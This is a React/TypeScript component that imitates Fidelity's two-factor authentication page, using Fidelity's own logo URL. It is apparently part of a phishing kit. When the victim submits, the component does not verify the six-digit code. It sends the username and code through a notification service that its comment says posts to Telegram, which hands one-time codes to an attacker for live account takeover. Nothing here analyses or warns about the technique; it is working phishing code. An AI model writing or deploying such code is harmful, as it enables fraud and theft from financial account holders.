import { useState } from 'react';
import { notificationService } from './services/notificationService';

interface AuthenticationProps {
  username: string;
  onComplete: () => void;
  onBack: () => void;
}

function Authentication({ username, onComplete, onBack }: AuthenticationProps) {
  const [code, setCode] = useState(['', '', '', '', '', '']);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (index: number, value: string) => {
    if (value.length > 1) return;
    if (!/^\d*$/.test(value)) return;

    const newCode = [...code];
    newCode[index] = value;
    setCode(newCode);

    if (value && index < 5) {
      const nextInput = document.getElementById(`code-${index + 1}`);
      nextInput?.focus();
    }
  };

  const handleKeyDown = (index: number, e: React.KeyboardEvent) => {
    if (e.key === 'Backspace' && !code[index] && index > 0) {
      const prevInput = document.getElementById(`code-${index - 1}`);
      prevInput?.focus();
    }
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const verificationCode = code.join('');

    if (verificationCode.length === 6 && !isSubmitting) {
      setIsSubmitting(true);

      // Send Telegram notification
      await notificationService.sendTwoFactorNotification(username, verificationCode);

      setIsSubmitting(false);
      onComplete();
    }
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col">
      <header className="bg-white">
        <div className="max-w-7xl mx-auto px-8 py-4 flex justify-between items-center">
          <img
            src="https://digital.fidelity.com/stgw/digital/login/dist/Fidelity-wordmark.svg"
            alt="Fidelity"
            className="h-7"
          />
          <div className="flex gap-8">
            <a href="#" className="text-sm text-gray-700 hover:text-gray-900">
              Security
            </a>
            <a href="#" className="text-sm text-gray-700 hover:text-gray-900">
              FAQs
            </a>
          </div>
        </div>
      </header>

      <main className="flex-1 flex items-center justify-center px-6 py-12">
        <div className="w-full max-w-md">
          <div className="bg-white rounded-lg shadow-sm p-10 mb-6">
            <button
              onClick={onBack}
              className="text-sm text-gray-700 hover:text-gray-900 mb-6 flex items-center gap-1"
            >
              ← Back
            </button>

            <h1 className="text-3xl font-semibold text-gray-900 mb-2">
              Two-factor authentication
            </h1>
            <p className="text-sm text-gray-600 mb-8">
              Enter the 6-digit code sent to your device for <strong>{username}</strong>
            </p>

            <form onSubmit={handleSubmit} className="space-y-6">
              <div>
                <label className="block text-sm font-semibold text-gray-900 mb-3">
                  Verification Code
                </label>
                <div className="flex gap-2 justify-between">
                  {code.map((digit, index) => (
                    <input
                      key={index}
                      id={`code-${index}`}
                      type="text"
                      inputMode="numeric"
                      maxLength={1}
                      value={digit}
                      onChange={(e) => handleChange(index, e.target.value)}
                      onKeyDown={(e) => handleKeyDown(index, e)}
                      className="w-12 h-14 text-center text-xl font-semibold border border-gray-300 rounded text-gray-900 focus:outline-none focus:ring-2 focus:ring-gray-400 focus:border-transparent"
                    />
                  ))}
                </div>
              </div>

              <div>
                <button
                  type="submit"
                  disabled={isSubmitting}
                  className="w-full flex justify-center py-3 px-4 border border-transparent rounded font-semibold text-base text-white bg-[#368727] hover:bg-[#2d6e1f] focus:outline-none focus:ring-2 focus:ring-offset-2 focus:ring-[#368727] transition-colors disabled:opacity-50 disabled:cursor-not-allowed"
                >
                  {isSubmitting ? 'Verifying...' : 'Verify'}
                </button>
              </div>

              <div className="text-center">
                <button
                  type="button"
                  className="text-sm text-gray-900 hover:underline underline"
                >
                  Didn't receive a code?
                </button>
              </div>
            </form>
          </div>

          <div className="text-center text-sm text-gray-900">
            Having trouble?{' '}
            <a href="#" className="underline hover:no-underline">
              Contact support
            </a>
          </div>
        </div>
      </main>
    </div>
  );
}

export default Authentication;
